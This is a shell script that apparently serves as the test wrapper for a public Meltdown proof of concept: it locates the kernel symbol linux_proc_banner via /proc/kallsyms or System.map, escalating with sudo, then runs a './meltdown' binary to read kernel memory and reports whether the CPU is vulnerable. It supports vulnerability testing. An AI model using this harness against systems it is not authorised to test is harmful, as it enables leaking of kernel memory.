#!/bin/sh

find_linux_proc_banner() {
	$2 sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_proc_banner$/\1/p' $1
}

echo "looking for linux_proc_banner in /proc/kallsyms"
linux_proc_banner=$(find_linux_proc_banner /proc/kallsyms)
if test -z $linux_proc_banner; then
	echo "protected. requires root"
	set -x
	linux_proc_banner=$(\
		find_linux_proc_banner /proc/kallsyms sudo)

	set +x
fi
if test -z $linux_proc_banner; then
	echo "not found. reading /boot/System.map-$(uname -r)"
	set -x
	linux_proc_banner=$(\
		find_linux_proc_banner /boot/System.map-$(uname -r) sudo)
	set +x
fi
if test -z $linux_proc_banner; then
	echo "not found. reading /boot/System.map"
	set -x
	linux_proc_banner=$(\
		find_linux_proc_banner /boot/System.map sudo)
	set +x
fi
if test -z $linux_proc_banner; then
	echo "can't find linux_proc_banner, unable to test at all"
	exit 0
fi

if command -v taskset >/dev/null; then
	taskset 0x1 ./meltdown $linux_proc_banner 10
else
	./meltdown $linux_proc_banner 10
fi
vuln=$?

if test $vuln -eq 132; then
	echo "ILLEGAL INSTRUCTION"
	echo "try recompile with:"
	echo " make CFLAGS='-DHAVE_RDTSCP=0' clean all"
	echo "and run again"
fi
if test $vuln -eq 1; then
	echo "PLEASE POST THIS TO https://github.com/paboldin/meltdown-exploit/issues/19"
	echo "VULNERABLE ON"
	uname -rvi
	head /proc/cpuinfo
	exit 1
fi
if test $vuln -eq 0; then
	echo "PLEASE POST THIS TO https://github.com/paboldin/meltdown-exploit/issues/22"
	echo "NOT VULNERABLE ON"
	uname -rvi
	head /proc/cpuinfo
	exit 0
fi
